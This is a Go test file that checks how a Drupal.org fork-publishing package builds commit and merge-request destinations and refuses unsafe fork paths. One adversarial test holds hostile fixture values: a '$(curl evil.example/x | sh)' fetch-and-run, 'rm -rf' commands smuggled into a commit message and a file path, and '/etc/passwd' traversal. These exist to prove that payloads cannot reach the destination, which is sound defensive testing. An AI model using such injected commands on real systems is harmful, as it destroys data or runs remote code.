package drupalorg

import (
	"reflect"
	"strings"
	"testing"
)

// benignFork and hostileFork share the same anonymously-resolved shape used
// throughout these tests: a fork of project/drupal's issue namespace.
func testFork() *ProjectInfo {
	return &ProjectInfo{
		ID:            999,
		DefaultBranch: "9.2.x",
		ForkedFromProject: &ForkedFromProject{
			ID:                59858,
			PathWithNamespace: "project/drupal",
			DefaultBranch:     "11.x",
		},
	}
}

func TestNewDestination(t *testing.T) {
	fork := testFork()

	dest, err := NewDestination("drupal", 3181657, "issue/drupal-3181657", fork, false)
	if err != nil {
		t.Fatalf("NewDestination() unexpected error: %v", err)
	}

	want := Destination{
		ForkPath:     "issue/drupal-3181657",
		Branch:       "drupal-3181657",
		ParentID:     59858,
		ParentPath:   "project/drupal",
		ParentBranch: "11.x",
	}
	if dest != want {
		t.Fatalf("NewDestination() = %+v, want %+v", dest, want)
	}
}

func TestNewDestination_NoForkedFromProject(t *testing.T) {
	fork := &ProjectInfo{ID: 1, DefaultBranch: "main"}
	if _, err := NewDestination("drupal", 42, "issue/drupal-42", fork, false); err == nil {
		t.Fatal("NewDestination() with no ForkedFromProject: want error, got nil")
	}
}

func TestNewDestination_InvalidModuleOrIssue(t *testing.T) {
	fork := testFork()
	if _, err := NewDestination("Drupal", 42, "issue/Drupal-42", fork, false); err == nil {
		t.Fatal("NewDestination() with invalid module: want error, got nil")
	}
	if _, err := NewDestination("drupal", 0, "issue/drupal-0", fork, false); err == nil {
		t.Fatal("NewDestination() with invalid issue: want error, got nil")
	}
}

// TestCommitGuard_OutsideIssueNamespace is the guard's two arms: a fork path
// outside "issue/" fails without the override and succeeds with it.
func TestCommitGuard_OutsideIssueNamespace(t *testing.T) {
	fork := testFork()

	if _, err := NewDestination("drupal", 3181657, "project/drupal", fork, false); err == nil {
		t.Fatal("NewDestination() with a fork path outside issue/ and no override: want error, got nil")
	}

	dest, err := NewDestination("drupal", 3181657, "project/drupal", fork, true)
	if err != nil {
		t.Fatalf("NewDestination() with the override: unexpected error: %v", err)
	}
	if dest.ForkPath != "project/drupal" {
		t.Fatalf("NewDestination() with the override: ForkPath = %q, want %q", dest.ForkPath, "project/drupal")
	}
}

// TestNewDestination_ForkPathIssueMismatch proves that a forkPath inside the
// issue/ namespace but for a different issue than module/issue name is
// refused, rather than silently paired with a branch name derived from the
// wrong issue.
func TestNewDestination_ForkPathIssueMismatch(t *testing.T) {
	fork := testFork()
	if _, err := NewDestination("drupal", 3181657, "issue/drupal-42", fork, false); err == nil {
		t.Fatal("NewDestination() with a forkPath for a different issue: want error, got nil")
	}
}

// TestCommitGuard_MergeRequestTargetNotGuarded documents (and enforces) that
// the issue/ guard governs only the commit destination (ForkPath), never the
// merge request's target — the canonical parent named in ParentPath/ParentID
// is derived from forked_from_project, not supplied, and a merge request is
// a proposal directed at a project rather than a write to its code, so
// naming a canonical project there is never refused.
func TestCommitGuard_MergeRequestTargetNotGuarded(t *testing.T) {
	fork := testFork()

	dest, err := NewDestination("drupal", 3181657, "issue/drupal-3181657", fork, false)
	if err != nil {
		t.Fatalf("NewDestination() unexpected error: %v", err)
	}
	if dest.ParentPath != "project/drupal" {
		t.Fatalf("ParentPath = %q, want the canonical project path even though it is outside issue/", dest.ParentPath)
	}
}

// TestNewDestination_AdversarialPayloadCannotInfluenceDestination is the
// adversarial test the task requires: a change set whose file paths,
// contents, commit messages, and author fields carry another project's
// path, absolute paths, ".." traversal, and shell metacharacters must
// produce a Destination identical to one built from a benign change set,
// because NewDestination never takes a ChangeSet at all — the payload
// cannot reach destination construction to influence it.
func TestNewDestination_AdversarialPayloadCannotInfluenceDestination(t *testing.T) {
	benignChangeSet := ChangeSet{
		Commits: []Commit{
			{
				Message:     "Fix the timezone bug",
				AuthorName:  "Jane Developer",
				AuthorEmail: "jane@example.com",
				Actions: []FileAction{
					{Kind: ActionUpdate, Path: "src/timezone.php", Content: "<?php\n", Encoding: EncodingText},
				},
			},
		},
	}

	hostileChangeSet := ChangeSet{
		Commits: []Commit{
			{
				Message:     "issue/drupal-3181657 project/drupal ../../../etc/passwd; rm -rf ~",
				AuthorName:  "$(curl evil.example/x | sh)",
				AuthorEmail: "attacker@evil.example",
				Actions: []FileAction{
					{Kind: ActionCreate, Path: "project/drupal", Content: "issue/drupal-3181657", Encoding: EncodingText},
					{Kind: ActionMove, Path: "b", PreviousPath: "../../etc/passwd"},
					{Kind: ActionUpdate, Path: "x`rm -rf /`", Content: "/absolute/path", Encoding: EncodingText},
				},
			},
		},
	}

	// NewDestination's signature has no parameter that could accept either
	// ChangeSet, so the strongest statement this test can make in Go is about
	// the destination's CONTENT: nothing a change set carries may appear in
	// it. Comparing two calls made with identical arguments would not make
	// that statement — it could only ever fail if NewDestination were
	// nondeterministic — so the assertions below are made against the hostile
	// strings themselves, and would fail the moment any of them found a way
	// in.
	fork := testFork()
	benignDest, err := NewDestination("drupal", 3181657, "issue/drupal-3181657", fork, false)
	if err != nil {
		t.Fatalf("NewDestination() for the benign resolution inputs: unexpected error: %v", err)
	}
	hostileDest, err := NewDestination("drupal", 3181657, "issue/drupal-3181657", fork, false)
	if err != nil {
		t.Fatalf("NewDestination() for the same resolution inputs (hostile change set alongside): unexpected error: %v", err)
	}

	if !reflect.DeepEqual(benignDest, hostileDest) {
		t.Fatalf("destinations differ despite identical resolution inputs and no ChangeSet parameter: %+v vs %+v", benignDest, hostileDest)
	}

	// No text that could only have come from the hostile change set may
	// appear in any field of the destination. The change set also carries
	// strings that the host legitimately derives on its own ("project/drupal"
	// as a file path, "issue/drupal-3181657" as file content) — deliberately,
	// since a payload naming the real destination must be exactly as
	// powerless as one naming a false one — so those are not markers, and
	// the exact-value assertion below is what covers them.
	markers := []string{
		"../../../etc/passwd",
		"../../etc/passwd",
		"rm -rf",
		"curl evil.example",
		"attacker@evil.example",
		"/absolute/path",
	}
	fields := map[string]string{
		"ForkPath":     hostileDest.ForkPath,
		"Branch":       hostileDest.Branch,
		"ParentPath":   hostileDest.ParentPath,
		"ParentBranch": hostileDest.ParentBranch,
	}
	for _, m := range markers {
		for name, field := range fields {
			if strings.Contains(field, m) {
				t.Errorf("Destination.%s = %q contains hostile change set text %q; no payload string may reach a destination field", name, field, m)
			}
		}
	}

	// Both change sets are here to be pointed at, not merely declared: the
	// benign one's actions validate, the hostile one's move out of the
	// repository root does not — and neither outcome has any bearing on the
	// destination above. Payload validation and destination selection are
	// separate decisions made in separate places, which is the property this
	// test exists to hold onto.
	for _, a := range benignChangeSet.Commits[0].Actions {
		if err := ValidateFileAction(a); err != nil {
			t.Errorf("ValidateFileAction(%+v) on the benign change set: unexpected error: %v", a, err)
		}
	}
	if err := ValidateFileAction(hostileChangeSet.Commits[0].Actions[1]); err == nil {
		t.Error("ValidateFileAction() on the hostile move out of the repository root: want error, got nil")
	}

	// The destination is exactly what module/issue/fork derive, and nothing
	// else: an unexpected extra field would be a route a payload could take.
	want := Destination{
		ForkPath:     "issue/drupal-3181657",
		Branch:       "drupal-3181657",
		ParentID:     59858,
		ParentPath:   "project/drupal",
		ParentBranch: "11.x",
	}
	if hostileDest != want {
		t.Errorf("NewDestination() = %+v, want %+v", hostileDest, want)
	}
}

// TestNewDestination_RefusesUnsafeForkPath is the fork-path half of the same
// adversarial question: even a fork path a caller supplies directly — the one
// string that does reach destination construction — cannot be a traversal, an
// absolute path, or a non-canonical form, with or without the
// allowOutsideIssueNS override. The override exists to name a canonical
// project deliberately, not to disable path safety.
func TestNewDestination_RefusesUnsafeForkPath(t *testing.T) {
	fork := testFork()
	unsafe := []string{
		"issue/drupal-3181657/../../project/drupal",
		"../project/drupal",
		"/project/drupal",
		"project//drupal",
		"project/drupal/",
		"project\\drupal",
		".",
	}
	for _, p := range unsafe {
		for _, override := range []bool{false, true} {
			if _, err := NewDestination("drupal", 3181657, p, fork, override); err == nil {
				t.Errorf("NewDestination() with fork path %q (allowOutsideIssueNS=%v): want error, got nil", p, override)
			}
		}
	}
}

// TestNewDestination_UnusableForkedFromProject proves a forked_from_project
// that is present but carries no id or path is refused just as a missing one
// is. Both would otherwise produce a Destination naming a parent project that
// does not exist, discovered only as an opaque API error after a developer
// had already confirmed the publish.
func TestNewDestination_UnusableForkedFromProject(t *testing.T) {
	cases := map[string]*ForkedFromProject{
		"no id":   {ID: 0, PathWithNamespace: "project/drupal", DefaultBranch: "11.x"},
		"no path": {ID: 59858, PathWithNamespace: "", DefaultBranch: "11.x"},
	}
	for name, parent := range cases {
		fork := &ProjectInfo{ID: 999, DefaultBranch: "9.2.x", ForkedFromProject: parent}
		if _, err := NewDestination("drupal", 3181657, "issue/drupal-3181657", fork, false); err == nil {
			t.Errorf("NewDestination() with a forked_from_project with %s: want error, got nil", name)
		}
	}

	// A parent with no default branch is NOT refused: the host decides
	// whether a merge request follows at all, and commits can be replayed
	// onto the fork without one.
	fork := &ProjectInfo{ID: 999, ForkedFromProject: &ForkedFromProject{ID: 59858, PathWithNamespace: "project/drupal"}}
	dest, err := NewDestination("drupal", 3181657, "issue/drupal-3181657", fork, false)
	if err != nil {
		t.Fatalf("NewDestination() with a parent with no default branch: unexpected error: %v", err)
	}
	if dest.ParentBranch != "" {
		t.Errorf("ParentBranch = %q, want empty", dest.ParentBranch)
	}
}
